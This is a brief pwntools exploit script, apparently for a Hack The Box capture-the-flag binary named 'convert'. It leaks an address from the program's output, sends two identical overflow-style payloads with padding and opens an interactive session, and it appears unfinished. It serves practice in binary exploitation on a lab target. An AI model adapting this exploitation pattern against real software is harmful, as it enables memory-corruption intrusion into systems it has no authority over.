from pwn import *

r = process("./convert")
gdb.attach(r, api=True)

print(r.recvuntil(b"^^\n"))
retaddr = int.from_bytes(r.recvuntil(b"Wel")[:-4], "little")
print(hex(retaddr))

payload = b"001\x00" + b"htb\x00" + b"5619082c1adaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00" 
r.sendline(payload)
print(r.recv())

payload2 = b"001\x00" + b"htb\x00" + b"5619082c1adaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00" 
r.sendline(payload2)
print(r.recv())
r.interactive()